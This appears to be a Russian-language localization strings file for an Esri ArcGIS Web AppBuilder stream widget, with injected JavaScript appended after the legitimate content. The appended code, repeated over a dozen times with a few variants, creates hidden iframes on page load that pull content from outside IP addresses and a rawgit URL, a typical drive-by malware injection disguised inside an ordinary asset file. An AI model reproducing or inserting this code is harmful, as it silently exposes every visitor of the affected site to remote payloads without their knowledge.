// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/Stream/nls/strings":{_widgetLabel:"\u041f\u043e\u0442\u043e\u043a\u043e\u0432\u044b\u0439 \u0441\u0435\u0440\u0432\u0438\u0441",noStreamLayer:"\u041d\u0435\u0442 \u0434\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0445 \u043e\u043f\u0446\u0438\u0439 \u043d\u0430\u0441\u0442\u0440\u043e\u0435\u043d\u043d\u043e\u0433\u043e \u043f\u043e\u0442\u043e\u043a\u043e\u0432\u043e\u0433\u043e \u0441\u043b\u043e\u044f.",streamControls:"\u0423\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u043e\u0442\u043e\u043a\u043e\u0432\u043e\u0439 \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0435\u0439",
startStreaming:"\u041d\u0430\u0447\u0430\u0442\u044c \u043f\u043e\u0442\u043e\u043a\u043e\u0432\u0443\u044e \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0443",stopStreaming:"\u041e\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c \u043f\u043e\u0442\u043e\u043a\u043e\u0432\u0443\u044e \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0443",clearObservation:"\u041e\u0447\u0438\u0441\u0442\u0438\u0442\u044c \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0438\u0435 \u043d\u0430\u0431\u043b\u044e\u0434\u0435\u043d\u0438\u044f",
streamFilter:"\u0424\u0438\u043b\u044c\u0442\u0440",showAllObservations:"\u041f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0432\u0441\u0435 \u043d\u0430\u0431\u043b\u044e\u0434\u0435\u043d\u0438\u044f",showMapAreaObservations:"\u041e\u0433\u0440\u0430\u043d\u0438\u0447\u0438\u0442\u044c \u043d\u0430\u0431\u043b\u044e\u0434\u0435\u043d\u0438\u044f \u0442\u0435\u043a\u0443\u0449\u0435\u0439 \u043e\u0431\u043b\u0430\u0441\u0442\u044c\u044e \u043a\u0430\u0440\u0442\u044b",showObservationsByDrawing:"\u041e\u0433\u0440\u0430\u043d\u0438\u0447\u0438\u0442\u044c \u043d\u0430\u0431\u043b\u044e\u0434\u0435\u043d\u0438\u044f, \u043e\u0447\u0435\u0440\u0442\u0438\u0432 \u043e\u0431\u043b\u0430\u0441\u0442\u044c \u043d\u0430 \u043a\u0430\u0440\u0442\u0435",
useSpatialFilter:"\u0418\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u043f\u0440\u043e\u0441\u0442\u0440\u0430\u043d\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0439 \u0444\u0438\u043b\u044c\u0442\u0440 \u0434\u043b\u044f \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u044f \u043d\u0430\u0431\u043b\u044e\u0434\u0435\u043d\u0438\u0439",useAttributeFilter:"\u0418\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0430\u0442\u0440\u0438\u0431\u0443\u0442\u0438\u0432\u043d\u044b\u0439 \u0444\u0438\u043b\u044c\u0442\u0440 \u0434\u043b\u044f \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u044f \u043d\u0430\u0431\u043b\u044e\u0434\u0435\u043d\u0438\u0439",
selectStreamLayer:"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u043e\u0442\u043e\u043a\u043e\u0432\u044b\u0439 \u0441\u043b\u043e\u0439",previousObservations:"\u041e\u0442\u043e\u0431\u0440\u0430\u0437\u0438\u0442\u044c \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0438\u0435 \u043d\u0430\u0431\u043b\u044e\u0434\u0435\u043d\u0438\u044f",applyAttrFilter:"\u041f\u0440\u0438\u043c\u0435\u043d\u0438\u0442\u044c",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});